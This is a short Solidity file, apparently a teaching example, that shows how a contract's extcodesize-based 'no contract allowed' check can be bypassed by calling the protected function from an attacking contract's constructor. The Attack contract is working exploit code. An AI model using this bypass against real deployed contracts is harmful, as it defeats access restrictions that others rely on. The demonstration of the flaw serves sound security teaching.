// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ContractSize {
    bool public checked = false;

    function protected() external {
        require(!isContract(), "no contract allowed");
        checked = true;
    }

    function isContract() public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        address a = msg.sender;
        assembly {
            size := extcodesize(a)
        }
        return size > 0;
    }
}

contract FailedAttack {
    function check(address _target) external {
        ContractSize(_target).protected();
    }
}

contract Attack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = ContractSize(_target).isContract();
        addr = address(this);
        ContractSize(_target).protected();
    }
}
